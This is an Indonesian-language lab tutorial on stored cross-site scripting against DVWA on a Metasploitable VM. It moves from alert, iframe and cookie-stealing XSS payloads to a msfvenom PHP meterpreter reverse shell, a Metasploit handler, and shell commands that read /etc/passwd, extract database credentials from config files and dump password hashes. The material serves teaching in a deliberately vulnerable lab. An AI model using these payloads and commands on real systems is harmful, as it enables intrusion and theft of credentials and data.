### Cross Site Scripting (XSS)

* Apa itu Cross Site Scripting?
  * Cross Site Scripting adalah tipe kelemahan sekuritas komputer yang biasa ditemukan.
  * XSS memungkinkan penyerang melakukan injeksi script ke dalam web app.
  * Script dapat mengakses cookies, session tokens, dan data sensitif.


| **Section 1: Atur popup ** |
| :--- |


1. Buka mozilla
2. Buka setting lalu content
3. Hapus centang di block popup windows

   * ![](/assets/lesson9/1.PNG)

| **Section 2: Login ke dalam DVWA** |
| :--- |


1. Buka browser
2. Login ke DVWA

   * Langkah**:**
     1. Buka firefox
     2. Masukkan ip metasploitable, contoh: [http://192.168.56.102/dvwa/login.php](http://192.168.56.102/dvwa/login.php).
     3. Login: admin
     4. Password: password
     5. Klik Login

| **Section 3: Tetapkan Tingkat Keamanan** |
| :--- |


1. Tetapkan tingkat keamanan DVWA

   * Langkah**:**  
     1. Klik bagian DVWA Security di menu bagian kiri.  
     2. Pilih "low"  
     3. Klik Submit

   * ![](/assets/lesson9/2.PNG)

| **Section 4: Stored Cross Site Scripting** |
| :--- |


1. Menu XSS stored

   * **Langkah:**
     1. Pilih "XSS Stored" dari menu bagian kiri.

2. Tes dasar XSS

   * **Langkah:**
     1. Masukkan data seperti berikut.
     2. Name : `Test 1`.
     3. Message : `<script>alert("This is a XSS Exploit Test")</script>`.
   * ![](/assets/lesson9/3.PNG)
   * ![](/assets/lesson9/4.PNG)


| **Section 5: XSS Stored Iframe Exploit** |
| :--- |


1. Reset Database

   * **Langkah:**
     1. Pilih setup pada menu bagian kiri
     2. klik tombol Create/Reset Database

   * ![](/assets/lesson9/5.PNG)

2. Iframe exploit

   * **Langkah:**
     1. Klik XSS Stored pada menu bagian kiri
     2. Masukkan data seperti berikut.
     3. Name : `Test 2`.
     4. Message : `<iframe src="http://www.cnn.com"></iframe>`
   * ![](/assets/lesson9/6.PNG)
   * ![](/assets/lesson9/7.PNG)

| **Section 6: XSS Stored COOKIE Exploit** |
| :--- |


  1. Reset Database

     * **Langkah:**
       1. Pilih setup pada menu bagian kiri
       2. klik tombol Create/Reset Database

     * ![](/assets/lesson9/8.PNG)

  2. Cookie exploit

     * **Langkah:**
       1. Klik XSS Stored pada menu bagian kiri
       2. Masukkan data seperti berikut.
       3. Name : `Test 3`.
       4. Message : `<script>alert(document.cookie)</script>`
     * ![](/assets/lesson9/9.PNG)
     * ![](/assets/lesson9/10.PNG)

| **Section 7: Membuat PHP Payload** |
| :--- |

  1. Membuat payload dengan msfvenom
     
     * **Langkah:**
       1. Buka terminal 
       2. `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f raw > FORUM_BUG.php`
     * ![](/assets/lesson9/11.PNG)

  2. Edit file php

     * **Langkah:**
       1. Hapus `/*` pada awal kode.
       2. Tambahkan `?>` pada akhir kode.
     * ![](/assets/lesson9/12.PNG)

| **Section 8: Menggunakan PHP payload ** |
| :--- |

  1. Upload php payload 
  
     * **Langkah:**
       1. Pilih upload pada menu bagian kiri
       2. Pilih file
       3. Klik upload
     * ![](/assets/lesson9/13.PNG)

  2. Nyalakan msfconsole
  
     * **Langkah:**
       1. Buka terminal
       2. `msfconsole`
       3. `use exploit/multi/handler`
       4. `set payload php/meterpreter/reverse_tcp`
       5. `set LHOST 192.168.56.101'
       6. `set LPORT 4444`
       7. `exploit`
     * ![](/assets/lesson9/14.PNG)

  3. Reset Database

     * **Langkah:**
       1. Pilih setup pada menu bagian kiri
       2. klik tombol Create/Reset Database

     * ![](/assets/lesson9/8.PNG)

  4. Menjalankan payload

     * **Langkah:**

       1. Klik XSS Stored pada menu bagian kiri
       2. Inspect element, ubah maxLength textbox message menjadi 100
       3. Masukkan data seperti berikut.
       4. Name : `Test 4`.
       5. Message : `<script>window.location="http://192.168.1.106/dvwa/hackable/uploads/FORUM_BUG.php" </script>`
       6. Jalankan
     * ![](/assets/lesson9/16.PNG)
     
  5. Menjalankan shell

     * **Langkah:**

       1. `shell`
       2. `tail /etc/passwd`
       * ![](/assets/lesson9/17.PNG)
       3. `whoami`
       4. `grep apache /etc/passwd`
       5. `find /var/www/* -print | grep config`
       * ![](/assets/lesson9/18.PNG)
       6. `grep "db_" /var/www/html/dvwa/config/config.inc.php`
       * ![](/assets/lesson9/19.PNG)
       7. `echo "use dvwa; show tables;" | mysql -uroot -pdvwaPASSWORD`
       8. `echo "use dvwa; desc users;" | mysql -uroot -pdvwaPASSWORD`
       9. `echo "select user,password from dvwa.users;" | mysql -uroot -pdvwaPASSWORD`
       * ![](/assets/lesson9/20.PNG)

| **Section 9: Eksploitasi file konfigurasi  ** |
| :--- |

  1. Membuat file html
  
     * **Langkah:**
       1. `echo "<pre>" >> /var/www/html/dvwa/hackable/uploads/xss.html`
       2. `echo "select user,password from dvwa.users;" | mysql -uroot -pdvwaPASSWORD >> /var/www/html/dvwa/hackable/uploads/xss.html`
       3. `echo "</pre>" >> /var/www/html/dvwa/hackable/uploads/xss.html`
       4. `echo "<br>Your Name<br>" >> /var/www/html/dvwa/hackable/uploads/xss.html`
       5. `date >> /var/www/html/dvwa/hackable/uploads/xss.html`
     * ![](/assets/lesson9/21.PNG)

  2. Hasil
  
     * **Langkah:**
       1. Buka link berikut:
          ```
            http://192.168.56.102/dvwa/hackable/uploads/xss.html
          ```
     * ![](/assets/lesson9/22.PNG)
